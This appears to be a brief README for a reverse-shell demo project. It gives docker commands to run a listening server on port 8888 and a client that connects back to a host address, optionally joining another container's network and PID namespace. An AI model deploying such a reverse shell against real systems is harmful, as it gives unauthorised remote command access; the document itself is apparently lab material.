# Reverse shell example

In order to run the server:

```
cd server/
docker build . -t reverse-shell-server
docker run -p 8888:8888 -it reverse-shell-server:latest
```


To run the client:
```
cd client/
docker build . -t reverse-shell-client


# If want to just run commands inside the docker container
docker run -e REMOTE_SERVER=172.17.0.1 -itd reverse-shell-client:latest


# if want to be on the same network and PID space as other docker containers
docker run -e REMOTE_SERVER=172.17.0.1 -itd --network=container:<container-name> --pid=container:<container-name> reverse-shell-client:latest
```
